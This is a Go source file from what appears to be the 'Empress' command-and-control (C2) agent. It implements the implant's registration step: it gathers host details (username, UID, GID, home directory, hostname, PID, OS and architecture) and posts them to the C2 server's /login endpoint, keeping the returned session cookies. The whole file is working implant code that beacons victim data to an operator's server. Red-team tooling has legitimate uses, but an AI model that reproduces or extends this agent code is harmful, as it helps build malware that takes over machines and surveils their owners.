package c2

import (
	"bytes"
	"encoding/json"
	"errors"
	"github.com/pygrum/Empress/config"
	"github.com/pygrum/Empress/transport"
	log "github.com/sirupsen/logrus"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strconv"
)

// Register authenticates to C2 server using agent ID and some other config.
// This function is run once to initiate a session, and so doesn't expect data in a response.
// If registration is successful, the client will have the received cookie set.
func (c *Client) Register(regInfo *transport.Registration) error {
	data, err := json.Marshal(regInfo)
	if err != nil {
		return err
	}
	addr := c.Address + "/login"
	u, err := url.Parse(c.Address) // use address rather than /login so we can use cookies with it
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodGet, addr, bytes.NewReader(data))
	if err != nil {
		return err
	}
	resp, err := c.HttpClient.Do(req)
	if err != nil {
		return err
	}
	log.Info("sent registration request, received response")
	if resp.StatusCode != http.StatusOK {
		return errors.New("")
	}
	log.Info("received cookies: %v", c.HttpClient.Jar.Cookies(u))
	c.HttpClient.Jar.SetCookies(u, resp.Cookies())
	return nil
}

// Registration returns information about the OS for registration to the C2.
// Optionally, provide a response to a 'lost' c2 request if connection failed.
func Registration(data *transport.Response) *transport.Registration {
	reg := &transport.Registration{
		AgentID: config.C.AgentID,
		OS:      runtime.GOOS,
		Arch:    runtime.GOARCH,
		PID:     strconv.Itoa(os.Getpid()),
		Data:    data,
	}
	u, err := user.Current()
	if err == nil {
		reg.Username = u.Username
		reg.UID = u.Uid
		reg.GID = u.Gid
		reg.HomeDir = u.HomeDir
	}
	hostname, err := os.Hostname()
	if err == nil {
		reg.Hostname = hostname
	}
	return reg
}
